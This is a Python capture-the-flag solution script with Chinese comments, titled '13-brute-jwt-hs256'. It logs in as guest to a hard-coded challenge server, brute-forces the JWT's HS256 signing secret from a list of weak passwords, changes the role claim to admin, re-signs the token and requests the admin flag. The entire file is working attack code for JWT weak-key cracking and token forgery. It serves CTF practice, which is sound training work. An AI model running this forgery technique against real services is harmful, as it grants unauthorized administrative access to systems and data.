#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
atexit.register(lambda: print("作者 ZluxYao"))
"""
13-brute-jwt-hs256
思路：guest 登录拿 JWT -> 离线爆破 HS256 弱密钥 -> 修改 role=admin -> 重新签名 -> 访问 /admin/flag
仅依赖 requests，JWT 的编码和签名手写实现，方便理解。
"""

import base64
import hashlib
import hmac
import json
import sys
from typing import Iterable, Optional

import requests

BASE_URL = "http://47.120.76.57:33858"
LOGIN_URL = BASE_URL + "/api/login"
FLAG_URL = BASE_URL + "/admin/flag"

# 小字典即可命中，本题 secret 是 qwerty；保留多几个常见弱口令体现爆破流程
CANDIDATE_SECRETS = [
    "secret", "jwt", "admin", "guest", "password", "123456",
    "qwerty", "test", "key", "flask", "ctf", "togogo",
]


def b64url_encode(raw: bytes) -> str:
    """JWT 使用 base64url，且去掉末尾 =。"""
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def b64url_decode(data: str) -> bytes:
    """给 base64url 补齐 = 后解码。"""
    data += "=" * ((4 - len(data) % 4) % 4)
    return base64.urlsafe_b64decode(data.encode())


def sign_hs256(header_b64: str, payload_b64: str, secret: str) -> str:
    signing_input = f"{header_b64}.{payload_b64}".encode()
    digest = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return b64url_encode(digest)


def brute_secret(token: str, candidates: Iterable[str]) -> Optional[str]:
    header_b64, payload_b64, sig = token.split(".")
    for secret in candidates:
        if sign_hs256(header_b64, payload_b64, secret) == sig:
            return secret
    return None


def forge_admin_token(token: str, secret: str) -> str:
    header_b64, payload_b64, _ = token.split(".")
    payload = json.loads(b64url_decode(payload_b64))
    payload["role"] = "admin"

    # separators 去空格，生成紧凑 JSON，保证 token 简洁
    new_payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    new_sig = sign_hs256(header_b64, new_payload_b64, secret)
    return f"{header_b64}.{new_payload_b64}.{new_sig}"


def main() -> None:
    print("[*] login as guest ...")
    r = requests.post(LOGIN_URL, json={"username": "guest", "password": "guest"}, timeout=10)
    r.raise_for_status()
    token = r.json()["token"]
    print("[+] guest token:", token)

    header_b64, payload_b64, _ = token.split(".")
    print("[+] header:", b64url_decode(header_b64).decode())
    print("[+] payload:", b64url_decode(payload_b64).decode())

    print("[*] brute force HS256 secret ...")
    secret = brute_secret(token, CANDIDATE_SECRETS)
    if not secret:
        print("[-] secret not found in candidate list", file=sys.stderr)
        sys.exit(1)
    print("[+] found secret:", secret)

    forged = forge_admin_token(token, secret)
    print("[+] forged admin token:", forged)

    print("[*] request flag ...")
    r = requests.get(FLAG_URL, headers={"Authorization": f"Bearer {forged}"}, timeout=10)
    print("[+] status:", r.status_code)
    print("[+] response:", r.text)

    try:
        flag = r.json().get("flag")
        if flag:
            print("[+] flag:", flag)
    except Exception:
        pass


if __name__ == "__main__":
    main()
